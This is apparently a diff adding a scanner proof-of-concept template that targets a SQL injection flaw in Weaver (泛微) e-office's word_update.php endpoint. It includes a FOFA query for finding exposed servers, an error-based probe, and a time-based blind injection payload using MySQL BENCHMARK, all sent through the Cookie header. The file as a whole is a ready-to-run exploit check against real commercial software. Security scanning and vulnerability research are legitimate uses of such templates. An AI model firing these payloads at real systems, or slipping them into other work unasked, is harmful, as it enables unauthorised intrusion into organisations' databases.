@@ -1,0 +1,24 @@
+id: poc-yaml-weaver-e-office-word-update-sqli
+info:
+  name: 泛微OA e-office word_update SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e-office
+  fofa: app="泛微-EOffice"
+variables:
+  t1: random_int(3,7)
+  t2: t1 + 3
+requests:
+- method: GET
+  path: /general/system/interface/loginedit/word_update.php
+  headers:
+    Cookie: divid=1'
+  expression: status_code == 200 && contains(body,"supplied argument is not a valid
+    MySQL result resource in")
+- method: GET
+  path: /general/system/interface/loginedit/word_update.php
+  headers:
+    Cookie: divid=1 AND 3742=BENCHMARK({{.t1}}000000,MD5(0x496c624d));wordcolor=5;content=
+  expression: status_code == 200 && body == "" && duration > t1 && duration < t2
+transport: http
